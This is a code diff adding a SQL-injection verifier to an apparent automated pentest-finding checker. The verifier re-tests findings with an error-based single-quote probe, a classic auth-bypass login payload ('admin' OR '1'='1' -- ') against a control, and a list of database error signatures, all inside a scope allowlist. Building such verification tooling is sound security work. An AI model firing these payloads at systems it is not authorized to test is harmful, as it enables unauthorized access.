@@ -407,6 +407,147 @@ def _verify_info_disclosure(
     )
 
 
+# --- SQL-injection re-prover (E#8) --------------------------------------------
+# Generic DB-engine error fingerprints (error-based confirmation). No app seeds.
+_SQL_ERROR_SIGNATURES: tuple[str, ...] = (
+    "you have an error in your sql syntax",
+    "warning: mysql", "mysqli", "mysql_fetch", "mysql_num_rows",
+    "unclosed quotation mark", "quoted string not properly terminated",
+    "ora-00933", "ora-01756", "oracle error",
+    "sqlite3.operationalerror", "sqlite error", "unrecognized token",
+    "psycopg2", "pg_query()", "postgresql query failed", "sqlstate[",
+    "microsoft odbc", "native client", "sql server", "syntax error at or near",
+)
+_INPUT_NAME_RE = re.compile(r"<input\b[^>]*\bname=[\"']([^\"']{1,64})[\"']", re.IGNORECASE)
+_PASSWORD_INPUT_RE = re.compile(r"<input\b[^>]*\btype=[\"']password[\"']", re.IGNORECASE)
+_BYPASS_USER = "admin' OR '1'='1' -- "
+_CONTROL_VALUE = "zzq_nomatch_4817"
+_AUTH_SUCCESS_KEYWORDS: tuple[str, ...] = (
+    "welcome", "dashboard", "logout", "congratulations", "flag",
+    "successfully", "you are logged in", "sign out",
+)
+
+
+def _sql_error_signature(text: str) -> str:
+    low = (text or "")[:32_768].lower()
+    return next((s for s in _SQL_ERROR_SIGNATURES if s in low), "")
+
+
+def _verify_sqli(
+    finding: Finding,
+    *,
+    http_client: httpx_client.Client,
+    scope_allowlist: dict[str, Any] | None,
+    timeout: float,
+) -> VerifierVerdict:
+    """Independent re-prove of a 'SQL Injection' claim (E#8).
+
+    Conservative + bounded (<=4 requests, no loops). Verdicts:
+    - ``confirmed`` — a SQL-engine error signature appears, OR a classic
+      auth-bypass payload produces a clear success-vs-failure differential.
+    - ``failed`` — ONLY when the injection is DEMONSTRABLY INERT: no SQL error
+      AND the injection-payload response is materially identical to a benign
+      control on the SAME form-extracted fields (input not processed in a SQL
+      context). This is the no-server-side-SQL false positive smart-web-probe
+      emits on dead login forms (XBEN-014/005).
+    - ``inconclusive`` — ambiguous (possible blind/2nd-order, reflection without
+      a clear signal, or no usable form) → KEEP for review. Never drop on doubt.
+    """
+    target_url = str(finding.target_id or "").strip()
+    sev = str(finding.severity or "")
+    if not target_url or not target_url.startswith(("http://", "https://")):
+        return _make_inconclusive(
+            finding, note=f"target_id is not an HTTP URL: {target_url!r}", verifier_used="sqli",
+        )
+    if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, target_url):
+        return _make_inconclusive(
+            finding, note="target URL out of scope for verifier",
+            verifier_used="sqli", checked_url=target_url,
+        )
+    try:
+        page = http_client.get(target_url, follow_redirects=False, timeout=timeout)
+    except httpx_client.HTTPError as exc:
+        return _make_inconclusive(
+            finding, note=f"HTTP error during verification: {type(exc).__name__}",
+            verifier_used="sqli", checked_url=target_url,
+        )
+    page_text = page.text or ""
+    saw_error = _sql_error_signature(page_text)
+    # Error-based: a bare single quote injected into GET query parameters.
+    sep = "&" if "?" in target_url else "?"
+    try:
+        err_resp = http_client.get(f"{target_url}{sep}id=%27&q=%27", follow_redirects=False, timeout=timeout)
+        saw_error = saw_error or _sql_error_signature(err_resp.text)
+    except httpx_client.HTTPError:
+        pass
+    # Differential auth-bypass on the page's REAL form fields (not guessed).
+    field_names = list(dict.fromkeys(_INPUT_NAME_RE.findall(page_text)))
+    has_password = bool(_PASSWORD_INPUT_RE.search(page_text))
+    differential_tested = False
+    auth_bypass_differential = False
+    inert = False
+    bypass_status = control_status = None
+    if field_names and has_password:
+        pw_names = [n for n in field_names if "pass" in n.lower() or "pwd" in n.lower()] or field_names[-1:]
+        user_names = [n for n in field_names if n not in pw_names] or field_names[:1]
+        user, pw = user_names[0], pw_names[0]
+        bypass_body = {n: "" for n in field_names}
+        bypass_body[user], bypass_body[pw] = _BYPASS_USER, _CONTROL_VALUE
+        control_body = {n: "" for n in field_names}
+        control_body[user] = control_body[pw] = _CONTROL_VALUE
+        try:
+            rb = http_client.post(target_url, data=bypass_body, follow_redirects=False, timeout=timeout)
+            rc = http_client.post(target_url, data=control_body, follow_redirects=False, timeout=timeout)
+            differential_tested = True
+            bypass_status, control_status = int(rb.status_code), int(rc.status_code)
+            saw_error = saw_error or _sql_error_signature(rb.text) or _sql_error_signature(rc.text)
+            bt, ct = (rb.text or "")[:16_384], (rc.text or "")[:16_384]
+            bypass_success = rb.status_code in (301, 302, 303) or any(k in bt.lower() for k in _AUTH_SUCCESS_KEYWORDS)
+            control_success = rc.status_code in (301, 302, 303) or any(k in ct.lower() for k in _AUTH_SUCCESS_KEYWORDS)
+            auth_bypass_differential = bypass_success and not control_success
+            # Reflection-normalised inert check: strip the (possibly echoed)
+            # injected values, then compare. Identical => input had no SQL effect.
+            bt_n = bt.replace(_BYPASS_USER, "").replace(_CONTROL_VALUE, "")
+            ct_n = ct.replace(_CONTROL_VALUE, "")
+            inert = (
+                rb.status_code == rc.status_code
+                and (bt_n.strip() == ct_n.strip() or abs(len(bt_n) - len(ct_n)) <= 8)
+            )
+        except httpx_client.HTTPError:
+            differential_tested = False
+    evidence = {
+        "saw_sql_error": bool(saw_error),
+        "sql_error_signature": saw_error or None,
+        "differential_tested": differential_tested,
+        "auth_bypass_differential": auth_bypass_differential,
+        "injection_inert": inert,
+        "bypass_status": bypass_status,
+        "control_status": control_status,
+        "form_fields": field_names[:8],
+    }
+    if saw_error or auth_bypass_differential:
+        return VerifierVerdict(
+            verdict="confirmed",
+            note=("SQL error signature present on injection" if saw_error
+                  else "classic auth-bypass produced a success/failure differential vs control"),
+            original_severity=sev, new_severity=sev,
+            verifier_used="sqli", checked_url=target_url, evidence=evidence,
+        )
+    if differential_tested and inert:
+        return VerifierVerdict(
+            verdict="failed",
+            note=("injection payload produced a response materially identical to a benign "
+                  "control and no SQL error — input not processed in a SQL context (not reproducible)"),
+            original_severity=sev, new_severity=_SEVERITY_DOWNGRADE.get(sev, sev),
+            verifier_used="sqli", checked_url=target_url, evidence=evidence,
+        )
+    return _make_inconclusive(
+        finding,
+        note="no SQL error, no auth-bypass differential, injection effect ambiguous — kept for review",
+        verifier_used="sqli", checked_url=target_url,
+    )
+
+
 _VerifierFn = Callable[
     [Finding],  # finding
     VerifierVerdict,
@@ -416,12 +557,20 @@ _VerifierFn = Callable[
 def _select_strategy(finding: Finding) -> str:
     """Pick a verification strategy name based on the finding's category
     and title keywords. Returns one of:
-    'admin_access' | 'stored_xss' | 'info_disclosure' | 'none'.
+    'sqli' | 'admin_access' | 'stored_xss' | 'info_disclosure' | 'none'.
 
     The picker is heuristic + emergent (no app-specific seeds). 'none' →
     verifier emits inconclusive (no independent check available)."""
     title_lower = str(finding.title or "").lower()
     methodology = " ".join(str(t).lower() for t in (finding.methodology_tags or []))
+    if (
+        "sql injection" in title_lower
+        or "sqli" in title_lower
+        or "sql-injection" in methodology
+        or "sql_injection" in methodology
+        or "sqli" in methodology
+    ):
+        return "sqli"
     if (
         "mass assignment" in title_lower
         or "privilege" in title_lower
@@ -504,6 +653,10 @@ def verify_finding(
         client = httpx_client.Client(timeout=timeout, follow_redirects=False, verify=True)
         owns_client = True
     try:
+        if strategy == "sqli":
+            return _verify_sqli(
+                finding, http_client=client, scope_allowlist=scope_allowlist, timeout=timeout,
+            )
         if strategy == "admin_access":
             return _verify_admin_access(
                 finding, http_client=client, scope_allowlist=scope_allowlist, timeout=timeout,
